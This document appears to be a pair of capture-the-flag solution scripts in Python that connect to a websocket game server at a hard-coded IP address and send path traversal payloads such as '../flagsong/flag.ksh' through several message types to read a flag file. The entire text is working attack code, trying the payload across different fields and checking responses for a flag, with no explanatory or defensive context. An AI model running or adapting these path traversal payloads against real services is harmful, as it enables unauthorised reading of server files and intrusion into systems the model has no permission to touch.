#!/usr/bin/env python3
import asyncio
import websockets
import json
import sys

async def connect_with_retry(uri, max_retries=3):
    for i in range(max_retries):
        try:
            return await websockets.connect(uri)
        except Exception as e:
            print(f"Connection attempt {i+1} failed: {e}")
            if i < max_retries - 1:
                await asyncio.sleep(1)
            else:
                raise

async def exploit():
    uri = "ws://34.234.204.29:39079"

    try:
        websocket = await connect_with_retry(uri)
        print("[+] Connected to server")

        # Initial handshake
        init_msg = {
            "type": "hello",
            "version": 1,
            "name": "player1",
            "room": "default"
        }
        await websocket.send(json.dumps(init_msg))
        response = await websocket.recv()
        print(f"[+] Server response: {response}")

        # Join room message
        join_msg = {
            "type": "join_room",
            "room": "default"
        }
        await websocket.send(json.dumps(join_msg))
        response = await websocket.recv()
        print(f"[+] Server response: {response}")

        # Try different path traversal payloads
        payloads = [
            {"type": "share_song", "path": "../flagsong/flag.ksh"},
            {"type": "load_chart", "path": "../flagsong/flag.ksh"},
            {"type": "get_song", "file": "../flagsong/flag.ksh"},
            {"type": "load_song", "name": "../flagsong/flag.ksh"}
        ]

        for payload in payloads:
            print(f"[+] Sending payload: {json.dumps(payload)}")
            await websocket.send(json.dumps(payload))

            try:
                response = await websocket.recv()
                print(f"[+] Response: {response}")
                if "flag{" in response:
                    print("[!] Found flag!")
                    await websocket.close()
                    return
            except Exception as e:
                print(f"[-] Error: {e}")
                continue

        await websocket.close()

    except Exception as e:
        print(f"[-] Error: {e}")
        return

if __name__ == "__main__":
    asyncio.get_event_loop().run_until_complete(exploit())

#!/usr/bin/env python3
import websocket
import json
import time

def on_message(ws, message):
    print(f"[+] Received: {message}")
    try:
        data = json.loads(message)
        if "flag" in message.lower():
            print(f"[!] Potential flag found: {message}")
    except:
        print("[*] Non-JSON message received")

def on_error(ws, error):
    print(f"[-] Error: {error}")

def on_close(ws, close_status_code, close_msg):
    print("[*] Connection closed")

def on_open(ws):
    print("[+] Connection established")

    # Send hello message
    hello = {
        "type": "hello",
        "name": "player",
        "game_version": "v1.0.0"
    }
    ws.send(json.dumps(hello))
    print("[+] Sent hello message")

    # Small delay to ensure hello is processed
    time.sleep(1)

    # Send path traversal payload
    payload = {
        "type": "share_song",
        "song_path": "../flagsong/flag.ksh"
    }
    ws.send(json.dumps(payload))
    print("[+] Sent path traversal payload")

def main():
    websocket.enableTrace(True)
    ws = websocket.WebSocketApp("ws://34.234.204.29:39079",
                              on_open=on_open,
                              on_message=on_message,
                              on_error=on_error,
                              on_close=on_close)

    ws.run_forever(ping_interval=5, ping_timeout=3)

if __name__ == "__main__":
    main()

